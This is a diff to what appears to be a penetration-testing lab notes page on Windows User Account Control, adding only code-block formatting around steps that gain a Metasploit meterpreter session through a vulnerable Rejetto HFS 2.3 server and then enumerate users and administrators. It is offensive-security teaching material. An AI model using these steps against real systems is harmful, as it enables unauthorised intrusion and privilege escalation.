@@ -32,6 +32,7 @@ description: User account control
 
 #### Gaining  a meterpreter session on the victim OS using Metasploit.
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```bash
 # we are leveraging the vuln from the victim web server running HFS http file server by rejetto, v2.3 .
 # service postgresql start && msfconsole
@@ -45,6 +46,7 @@ set LHOST and LHOST  # everything is set by default in the lab.
 exploit
 # we get a meterpreter session.
 ```
+{% endcode %}
 
 #### Step 1
 
@@ -52,6 +54,7 @@ Perform basic enumeration and make sure that the user you're currently logged wi
 
 In our meterpreter session
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```bash
 sysinfo  # returns system information.
 # we can see we have a 32bit "x86/window" meterpreter session.
@@ -67,6 +70,7 @@ net user  # Returns the list of users on the system.
 net localgroup administrators #Returns the list of users part of the administrator local group.
 
 ```
+{% endcode %}
 
 #### Step 2
 
